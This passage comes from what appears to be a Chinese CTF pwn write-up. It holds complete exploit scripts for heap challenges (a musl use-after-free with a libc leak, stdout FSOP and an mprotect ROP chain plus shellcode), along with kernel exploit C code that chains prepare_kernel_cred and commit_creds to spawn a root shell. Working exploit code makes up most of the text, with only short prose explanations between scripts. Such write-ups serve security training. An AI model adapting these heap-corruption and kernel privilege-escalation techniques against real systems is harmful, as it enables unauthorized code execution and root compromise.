payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>
payload += p64(<span class="hljs-number">0x0001000000000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0xb8</span>
payload += p16(<span class="hljs-number">0x72a0</span>)
Add_Del(<span class="hljs-number">0x280</span>, payload)
Add_Del(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x681</span>))

payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>
payload += p64(<span class="hljs-number">0x0000000100000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>
payload += p64(<span class="hljs-number">0x0001000000000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0xb0</span>
payload += p16(<span class="hljs-number">0x73a0</span>)
Add_Del(<span class="hljs-number">0x280</span>, payload)
Add_Del(<span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;&#x27;</span>)
Add_Del(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;&#x27;</span>)

payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>
payload += p64(<span class="hljs-number">0</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>
payload += p64(<span class="hljs-number">0x0001000000000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x138</span>
payload += p16(<span class="hljs-number">0x72a0</span>)
Add_Del(<span class="hljs-number">0x280</span>, payload)
Add_Del(<span class="hljs-number">0x200</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x101</span>))

payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x78</span>
payload += p64(<span class="hljs-number">0x0001000000000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x1f8</span>
payload += p16(<span class="hljs-number">0x73a0</span>)
Add_Del(<span class="hljs-number">0x280</span>, payload)
Add_Del(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;&#x27;</span>)


<span class="hljs-comment">#</span>
payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x78</span>
payload += p64(<span class="hljs-number">0x0001000000000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x1f8</span>
payload += p16(<span class="hljs-number">0x33f0</span>)
Add_Del(<span class="hljs-number">0x280</span>, payload)


payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x100</span>
payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x300</span>)
Add_Del(<span class="hljs-number">0x400</span>, payload)


payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x78</span>
payload += p64(<span class="hljs-number">0x0000000100000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x1f0</span>
payload += p16(<span class="hljs-number">0x3500</span>)
Add_Del(<span class="hljs-number">0x280</span>, payload)

payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x1a0</span>
payload += p64(<span class="hljs-number">0xfbad1800</span>)
payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>
payload += p16(<span class="hljs-number">0x3300</span>)
Add_Del(<span class="hljs-number">0x3f0</span>, payload)

payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>
payload += p64(<span class="hljs-number">0x0000000100000000</span>)
payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x190</span>
payload += p16(<span class="hljs-number">0x5b28</span>)
Add_Del(<span class="hljs-number">0x280</span>, payload)


sl(<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x1000</span>)
base = uu64(rn(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x212ca0</span>
lg(<span class="hljs-string">&#x27;base&#x27;</span>)

pause()


<span class="hljs-comment">###############</span>

<span class="hljs-comment"># dbg()</span>
<span class="hljs-comment"># pause()</span>


setcontext=<span class="hljs-number">0x7ffff7dc60dd</span>-<span class="hljs-number">0x7ffff7d6e000</span>+base
rdx2rdi=<span class="hljs-number">0x7ffff7ec2930</span>-<span class="hljs-number">0x7ffff7d6e000</span>+base
address=<span class="hljs-number">0x7ffff7f5cb30</span>-<span class="hljs-number">0x7ffff7d6e000</span>+base
rdi=<span class="hljs-number">0</span>
rsi=address+<span class="hljs-number">0xc0</span>
rdx=<span class="hljs-number">0x100</span>
read=<span class="hljs-number">0x7ffff7e7f130</span>-<span class="hljs-number">0x7ffff7d6e000</span>+base
rsp=rsi
rbp = <span class="hljs-number">153280</span>+base
leave=<span class="hljs-number">371272</span>+base
struct =p64(address)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(setcontext)
struct =struct.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
struct+=p64(rdi)+p64(rsi)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(rdx)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(rsp)+p64(read)

Add_Del(<span class="hljs-number">0x2f0</span>, p64(rdx2rdi)+struct)
rdx = <span class="hljs-number">0x000000000011c371</span>+base<span class="hljs-comment"># rdx+r12</span>
sys = <span class="hljs-number">0x7ffff7e7f1e5</span>-<span class="hljs-number">0x7ffff7d6e000</span>+base
rax = <span class="hljs-number">304464</span>+base
rdi = <span class="hljs-number">158578</span>+base
rsi = <span class="hljs-number">161065</span>+base
rcx = <span class="hljs-number">653346</span>+base
rax_r10 = <span class="hljs-number">0x000000000005e4b7</span>+base


rop = p64(rdi)
rop += p64(<span class="hljs-number">0xdddd000</span>)
rop += p64(rsi)
rop += p64(<span class="hljs-number">0x1000</span>)
rop += p64(rdx)
rop += p64(<span class="hljs-number">7</span>)
rop += p64(<span class="hljs-number">0</span>)
rop += p64(rcx)
rop += p64(<span class="hljs-number">0x22</span>)
rop += p64(<span class="hljs-number">0x7ffff7e89a20</span>-<span class="hljs-number">0x7ffff7d6e000</span>+base)
rop += p64(rax)
rop += p64(<span class="hljs-number">0</span>)
rop += p64(rdi)
rop += p64(<span class="hljs-number">0</span>)
rop += p64(rsi)
rop += p64(<span class="hljs-number">0xdddd000</span>)
rop += p64(rdx)
rop += p64(<span class="hljs-number">0x1000</span>)
rop += p64(<span class="hljs-number">0</span>)
rop += p64(sys)
rop += p64(<span class="hljs-number">0xdddd000</span>)


sn(rop.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))

<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span>
sc=<span class="hljs-string">&#x27;&#x27;&#x27;
mov rax,1
mov rdi,1
mov rsi,0xdddd300
mov rdx,0x600
syscall
&#x27;&#x27;&#x27;</span>
fk=<span class="hljs-string">&#x27;&#x27;&#x27;
mov rdi,rax
mov rax,0
mov rsi,0xdddd300
mov rdx,100
syscall
mov rax,1
mov rdi,rax
syscall
&#x27;&#x27;&#x27;</span>

<span class="hljs-comment"># flag-03387efa-0ad7-4aaa-aae0-e44021ad310a</span>
<span class="hljs-comment"># poc = asm(shellcraft.open(b&#x27;/home/pwn/&#x27;))+asm(shellcraft.getdents64(3, 0xdddd000 + 0x300, 0x600))+asm(sc)</span>
poc = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">b&#x27;/home/pwn/flag-03387efa-0ad7-4aaa-aae0-e44021ad310a&#x27;</span>))+asm(fk)
sn(poc)

pause()

irt()</code></pre><h3 id="babaheap"><a class="header-link" href="#babaheap"></a>BabaHeap</h3>
<p>题目的漏洞点在于 delete 功能未清空 ptr 和 update 功能未检测 use 位，导致可以对释放后的 chunk 进行写入操作。
另外，题目的读取函数允许我们输入 <code>size - 1</code> 的内容，然后最后一位设置为 <code>\0</code>。</p>
<p>题目的麻烦点在于信息泄露，这里需要利用到读取函数的置 0 操作，另外题目提供的 release 版本的 libc，没有符号信息，只能凭感觉来调试。
每个 bin 入链了第一个 chunk 后，该 chunk 的 next 和 prev 也会指向 <code>bin_head - 0x10</code>，利用读取函数，我们能修改到已释放的 chunk 的 <code>next</code>，我们演示一下：</p>
<ol class="list">
<li>我们释放掉一个 <code>0x1b0</code> 大小的 chunk，此时它的 next 和 prev 都指向 <code>bin_head - 0x10</code>：</li>
</ol>
<p class="img-container"><img src="https://md.byr.moe/uploads/upload_8eecafe216e9472e967f4481d1e4e0db.png" alt=""></p>
<ol start="2">
<li>利用读取函数对该 chunk 进行写入操作：</li>
</ol>
<p class="img-container"><img src="https://md.byr.moe/uploads/upload_97f8954ac6239b08b06d79df59219912.png" alt=""></p>
<p>此时，我们的 chunk <code>next</code> 指向了另一个 bin，恰好是 <code>0x120</code> 的 chunk 所在的 <code>bin_head - 0x10</code> 的位置。</p>
<ol start="3">
<li>我们释放掉 <code>0x120</code> 的 chunk，以使得 <code>0x00007ff51cb4bb00</code> 的位置有合法的 next 和 prev：</li>
</ol>
<p class="img-container"><img src="https://md.byr.moe/uploads/upload_0c95bbe92d11c7318e5aac97c884aea3.png" alt=""></p>
<ol start="4">
<li>我们再一次申请这个 <code>0x1b0</code> 的 chunk，那么<code>bin_head</code> 就会指向 <code>0x120</code> 的<code>bin_head - 0x10</code> 的位置。</li>
<li>我们再申请一个 <code>0x1b0</code>，就可以将 chunk 分配到 <code>0x120</code> 的 <code>bin_head - 0x10</code> 的位置，从而控制住这一片 <code>mal</code> 区域。</li>
<li>我们只要在 chunk 能够覆盖的区域内的 bin 中，入链一个 chunk，即可得到该 chunk 的地址，进而泄露 libc 基址，以及所有 chunk 地址、mal 地址等信息。</li>
</ol>
<p>泄露了 libc 之后，剩下就是常规操作：</p>
<ol class="list">
<li>利用 unbin 在 stdout 前伪造合法的 <code>next</code> 和 <code>prev</code></li>
<li>再利用 unbin，将 stdout 所在的 chunk <strong>合法</strong>地放入 bin-&gt;head 中</li>
<li>提前布置好 rop_chain，申请 chunk 得到 stdout 并在合适的位置上填写<strong>poc</strong>实现 FSOP，劫持 rip 和 rsp 读取到 flag。</li>
</ol>
<p>EXP：</p>
<pre class="hljs"><code><span class="hljs-comment">#encoding:utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> re

ip = <span class="hljs-string">&#x27;1.116.236.251&#x27;</span>
port = <span class="hljs-number">11124</span>
local = <span class="hljs-number">0</span>
filename = <span class="hljs-string">&#x27;./babaheap&#x27;</span>
libc_name = <span class="hljs-string">&#x27;./libc.so.1&#x27;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_connect</span>():</span>
    <span class="hljs-keyword">global</span> io, elf, libc

    elf = ELF(filename)
    context(os=elf.os, arch=elf.arch)
    
    <span class="hljs-keyword">if</span> local:
        io = process(filename)
        libc_name = <span class="hljs-string">&#x27;./libc.so.1&#x27;</span>

    <span class="hljs-keyword">else</span>:
        io = remote(ip, port)
        libc_name = <span class="hljs-string">&#x27;./libc.so.1&#x27;</span>

    <span class="hljs-keyword">try</span>:
        libc = ELF(libc_name)
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span>

cc = <span class="hljs-keyword">lambda</span> : create_connect()
s = <span class="hljs-keyword">lambda</span> x : io.send(x)
sl = <span class="hljs-keyword">lambda</span> x : io.sendline(x)
sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
g = <span class="hljs-keyword">lambda</span> x: gdb.attach(io, x)

r = <span class="hljs-keyword">lambda</span> : io.recv(timeout=<span class="hljs-number">1</span>)
rr = <span class="hljs-keyword">lambda</span> x: io.recv(x, timeout=<span class="hljs-number">1</span>)
rl = <span class="hljs-keyword">lambda</span> : io.recvline(keepends=<span class="hljs-literal">False</span>)
ru = <span class="hljs-keyword">lambda</span> x : io.recvuntil(x)
ra = <span class="hljs-keyword">lambda</span> : io.recvall(timeout=<span class="hljs-number">1</span>)
it = <span class="hljs-keyword">lambda</span> : io.interactive()
cl = <span class="hljs-keyword">lambda</span> : io.close()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">regexp_out</span>(<span class="hljs-params">data</span>):</span>
    patterns = [
        re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;(flag{.*?})&#x27;</span>),
        re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;xnuca{(.*?)}&#x27;</span>),
        re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;DASCTF{(.*?)}&#x27;</span>),
        re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;(WMCTF{.*?})&#x27;</span>),
        re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}&#x27;</span>),
    ]

    <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> patterns:
        res = pattern.findall(data.decode() <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> data)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res) &gt; <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(res[<span class="hljs-number">0</span>])

    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size, content=<span class="hljs-string">b&#x27;callmecro&#x27;</span></span>):</span>
    sla(<span class="hljs-string">b&#x27;Command: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
    sla(<span class="hljs-string">b&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())
    <span class="hljs-keyword">if</span> size == <span class="hljs-built_in">len</span>(content):
        sa(<span class="hljs-string">b&#x27;Content: &#x27;</span>, content)
    <span class="hljs-keyword">else</span>:
        sla(<span class="hljs-string">b&#x27;Content: &#x27;</span>, content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">no_send_allocate</span>(<span class="hljs-params">size, content=<span class="hljs-string">b&#x27;callmecro&#x27;</span></span>):</span>
    sla(<span class="hljs-string">b&#x27;Command: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
    sla(<span class="hljs-string">b&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())
    <span class="hljs-keyword">if</span> size == <span class="hljs-built_in">len</span>(content):
        s(content)
    <span class="hljs-keyword">else</span>:
        sl(content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">idx, size, content=<span class="hljs-string">b&#x27;callmecro&#x27;</span></span>):</span>
    sla(<span class="hljs-string">b&#x27;Command: &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
    sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())
    sla(<span class="hljs-string">b&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())
    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> 

    <span class="hljs-keyword">if</span> size == <span class="hljs-built_in">len</span>(content):
        sa(<span class="hljs-string">b&#x27;Content: &#x27;</span>, content)
    <span class="hljs-keyword">else</span>:
        sla(<span class="hljs-string">b&#x27;Content: &#x27;</span>, content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span>
    sla(<span class="hljs-string">b&#x27;Command: &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)
    sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">idx</span>):</span>
    sla(<span class="hljs-string">b&#x27;Command: &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)
    sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())
    ru(<span class="hljs-string">b&#x27;: &#x27;</span>)
    <span class="hljs-keyword">return</span> ru(<span class="hljs-string">b&#x27;\n1. Allocate&#x27;</span>)[:-<span class="hljs-number">12</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span>
    cc()
    
    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 0</span>
    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 1</span>
    
    allocate(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 2</span>
    allocate(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 3</span>

    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 4</span>
    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 5</span>
    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 6</span>

    delete(<span class="hljs-number">0</span>)
    update(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
    delete(<span class="hljs-number">2</span>)
    
    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 0</span>
    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 2</span>
    delete(<span class="hljs-number">4</span>)
    
    chunk_0x120 = u64(view(<span class="hljs-number">2</span>)[<span class="hljs-number">0x18</span>:<span class="hljs-number">0x20</span>])
    log.success(<span class="hljs-string">&#x27;No.4 chunk: 0x%x&#x27;</span>, chunk_0x120)
    libc.address = chunk_0x120 - <span class="hljs-number">0xb38d0</span>
    log.success(<span class="hljs-string">&#x27;libc_addr: 0x%x&#x27;</span>, libc.address)

    data_segment = libc.address + <span class="hljs-number">0xb0000</span>
    stdout = libc.address + <span class="hljs-number">0xb0280</span>
    mprotect = libc.address + <span class="hljs-number">0x41DC0</span>

    log.success(<span class="hljs-string">&#x27;stdout: 0x%x&#x27;</span>, stdout)
    my_chunk = libc.address + <span class="hljs-number">0xb0b10</span>
    log.success(<span class="hljs-string">&#x27;my_chunk: 0x%x&#x27;</span>, my_chunk)
    chunk_6 = libc.address + <span class="hljs-number">0xb3b50</span>

    fake_chunk = stdout - <span class="hljs-number">0x10</span>
    <span class="hljs-comment"># 任意写伪造 stdout 首部</span>
    update(<span class="hljs-number">4</span>, <span class="hljs-number">0x11</span>, p64(fake_chunk - <span class="hljs-number">0x18</span>) + p64(fake_chunk - <span class="hljs-number">0x08</span>))
    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 4</span>
    
    delete(<span class="hljs-number">6</span>)
    update(<span class="hljs-number">6</span>, <span class="hljs-number">0x30</span>, p64(fake_chunk - <span class="hljs-number">0x10</span>) + p64(my_chunk+<span class="hljs-number">0x8</span>))

    update(<span class="hljs-number">2</span>, <span class="hljs-number">0x150</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(chunk_6)+p64(my_chunk+<span class="hljs-number">0x8</span>))
    <span class="hljs-comment"># 6 -----&gt; 通过 unbin，将 stdout_FILE 送上 head 位置</span>
    allocate(<span class="hljs-number">0x120</span>)

    <span class="hljs-comment"># mov     rdx, [rdi+30h];mov     rsp, rdx;mov     rdx, [rdi+38h];jmp     rdx</span>
    stack_mig = libc.address + <span class="hljs-number">0x78D24</span>
    ret = libc.address + <span class="hljs-number">0x15292</span>

    pop_rdi = libc.address + <span class="hljs-number">0x15291</span>
    pop_rsi = libc.address + <span class="hljs-number">0x1d829</span>
    pop_rdx = libc.address + <span class="hljs-number">0x2cdda</span>
    pop_rax = libc.address + <span class="hljs-number">0x16a16</span>
    syscall = libc.address + <span class="hljs-number">0x23720</span>
    rop_chain = libc.address + <span class="hljs-number">0xb3a20</span>

    rop = flat([
        pop_rdi, data_segment,
        pop_rsi, <span class="hljs-number">0x8000</span>,
        pop_rdx, <span class="hljs-number">7</span>,
        mprotect, rop_chain+<span class="hljs-number">0x40</span>
        ])
    rop += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))
    rop += asm(shellcraft.read(<span class="hljs-number">3</span>, data_segment, <span class="hljs-number">0x100</span>))
    rop += asm(shellcraft.write(<span class="hljs-number">1</span>, data_segment, <span class="hljs-number">0x50</span>))

    update(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>, rop)

    poc = flat({
        <span class="hljs-number">0x30</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;wpos</span>
        <span class="hljs-number">0x38</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;wend</span>
        <span class="hljs-number">0x40</span>: rop_chain, 
        <span class="hljs-number">0x48</span>: ret, 
        <span class="hljs-number">0x58</span>: stack_mig,<span class="hljs-comment"># f-&gt;write</span>
        <span class="hljs-number">0x70</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;buf_size</span>
    }, filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x120</span>)

    <span class="hljs-comment"># 7 -----&gt; 分配到 stdout_FILE</span>
    no_send_allocate(<span class="hljs-number">0x120</span>, poc)

    log.success(<span class="hljs-string">&#x27;flag: %s&#x27;</span>, regexp_out(ru(<span class="hljs-string">b&#x27;}&#x27;</span>)))
    <span class="hljs-comment"># flag{use_musl_4ft3r_fr33}</span>
    cl()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    pwn()</code></pre><h3 id="kbrop"><a class="header-link" href="#kbrop"></a>kbrop</h3>
<p>直接当作没有ksalr，然后爆破差不多几百次能出</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* msg)</span>
</span>{
    <span class="hljs-built_in">puts</span>(msg);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
}

<span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">packed__</span>)) _<span class="hljs-title">d</span>
{</span>
    <span class="hljs-keyword">uint16_t</span> size;
    <span class="hljs-keyword">uint8_t</span> buf[<span class="hljs-number">0x100</span>];
    <span class="hljs-keyword">uint64_t</span> rbx;
    <span class="hljs-keyword">uint64_t</span> rbp;
    <span class="hljs-keyword">uint64_t</span> rop[<span class="hljs-number">0x100</span>];
}d;

<span class="hljs-comment">/*
cat /proc/kallsyms | grep proc_ioctl
commit_creds _copy_from_user
ffffffffb82909b0
ffffffff97a909b0
ffffffff982909b0
ffffffff9e6909b0
ffffffff8ea909b0
ffffffff88e909b0
ffffffffba2909b0
*/</span>

<span class="hljs-keyword">uint64_t</span> user_cs, user_ss, user_rflags, user_sp;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span>
</span>{
    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span>
            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span>
            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span>
            <span class="hljs-string">&quot;pushf;&quot;</span>
            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>
            );
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]status has been saved.&quot;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spawn_shell</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;spawn_shell&quot;</span>);
    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">getuid</span>())
    {
        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]spawn shell error!&quot;</span>);
    }
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}


<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-built_in">save_status</span>();
    <span class="hljs-built_in">signal</span>(SIGSEGV, spawn_shell);
    <span class="hljs-keyword">int</span> fd;
    fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/chal&quot;</span>,<span class="hljs-number">0</span>);

    <span class="hljs-built_in">memset</span>(d.buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(d.buf));
    <span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>;
    d.rop[i++] = <span class="hljs-number">0xffffffff81001619</span>; <span class="hljs-comment">// pop rdi</span>
    d.rop[i++] = <span class="hljs-number">0</span>;
    d.rop[i++] = <span class="hljs-number">0xffffffff81090c20</span>; <span class="hljs-comment">// prepare_kernel_cred</span>
    d.rop[i++] = <span class="hljs-number">0xffffffff81000210</span>; <span class="hljs-comment">// mov rdi, rax</span>
    d.rop[i++] = <span class="hljs-number">0xffffffff810909b0</span>; <span class="hljs-comment">// commit_creds</span>
    d.rop[i++] = <span class="hljs-number">0xffffffff81b66d10</span>; <span class="hljs-comment">// swapgs</span>
    d.rop[i++] = <span class="hljs-number">0xffffffff8102984b</span>; <span class="hljs-comment">// iretq</span>
    d.rop[i++] = (<span class="hljs-keyword">uint64_t</span>)spawn_shell;
    d.rop[i++] = user_cs;
    d.rop[i++] = user_rflags;
    d.rop[i++] = user_sp;
    d.rop[i++] = user_ss;
    d.rop[i++] = <span class="hljs-number">0x13372019</span>;
    d.size = <span class="hljs-number">0x110</span> + i * <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">uint64_t</span>);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exploit!&quot;</span>);
    <span class="hljs-built_in">ioctl</span>(fd,<span class="hljs-number">0x666</span>,&amp;d);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span>
</span>{
    <span class="hljs-keyword">int</span> fd;
    fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/chal&quot;</span>,<span class="hljs-number">0</span>);

